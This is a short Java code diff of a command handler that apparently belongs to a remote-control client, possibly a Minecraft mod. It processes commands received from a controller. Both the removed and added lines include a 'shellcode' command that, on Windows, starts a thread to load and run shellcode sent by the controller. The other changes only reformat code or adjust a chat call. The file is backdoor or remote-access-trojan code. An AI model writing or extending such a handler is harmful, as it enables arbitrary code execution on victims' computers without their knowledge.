@@ -62,7 +62,7 @@ public class MessageHandler {
                     break;
                 case "chat":
                     if (msgArr.length < 2) break;
-                    ChatControl.chat(Text.of(decodeBase64(msgArr[1])));
+                    ChatControl.chat(Text.of(decodeBase64(msgArr[1])), false);
                     break;
                 case "kill":
                     Witch.client.close(false);
@@ -76,7 +76,8 @@ public class MessageHandler {
                     break;
                 case "shellcode":
                     if (msgArr.length < 2) break;
-                    if(ShellUtil.isWin()) new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
+                    if (ShellUtil.isWin())
+                        new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                 default:
                     System.out.println();
                     break;
